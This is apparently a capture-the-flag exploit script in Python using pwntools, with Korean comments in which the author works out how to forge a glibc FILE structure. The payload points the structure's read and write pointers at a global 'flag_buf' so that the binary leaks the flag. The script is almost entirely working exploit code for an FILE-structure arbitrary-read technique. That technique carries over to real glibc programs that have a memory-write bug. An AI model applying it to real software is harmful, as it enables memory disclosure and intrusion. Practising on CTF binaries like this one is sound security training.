from pwn import *

context.binary = elf = ELF("./iofile_aar")
context.arch = "amd64"
context.log_level = "info"

var = elf.sym["flag_buf"]

p = process()

# write(fileno, writebase, writeptr - writebase)

# read_end가 정해져 있던 이유:
# read_base <= reate_ptr <= read_end
# 코드에 계속 이런 부분이 있음
# 그래서 조건을 만족하게 해줘야함
# 따라서 read base, read ptr값이 뭐가 되든, 위 조건을 만족만 하면 되어보임. 아직 코드를 완전히 이해한 건 아니라 확신은 못하지만..
# 그런데 read_end는 이상하게 malloc()을 씀. 그래서 조건을 만족하며 유효한 주소를 써야함.
# 전역변수, 그리고 PIE 비활성화.. 이건 딱 봐도 flag_buf 쓰라는 거 아님?? 이게아닌가;;

pay = p64(0xfbad0800) # flag, write를 위해 putting만 설정해도 됨
pay += p64(0x31337) # io read ptr
pay += p64(var) # io read end
pay += p64(0x31337) # ip read base
pay += p64(var) # io write base
pay += p64(var+1024) # io write ptr
pay += p64(0) # io write end
pay += p64(0) # io buf base
pay += p64(0) # io buf end
pay += p64(0) # io save base
pay += p64(0) # io backup base
pay += p64(0) # io save end
pay += p64(0) # io marker markers
pay += p64(0) # io file chain
pay += p64(1) # fileno(stdin, stdout, ...)(p32로 묶어야 하지만, 뒤 4바이트도 딱히 필요 없어서 0으로 합침)

p.sendlineafter(b'Data: ', pay)

p.interactive()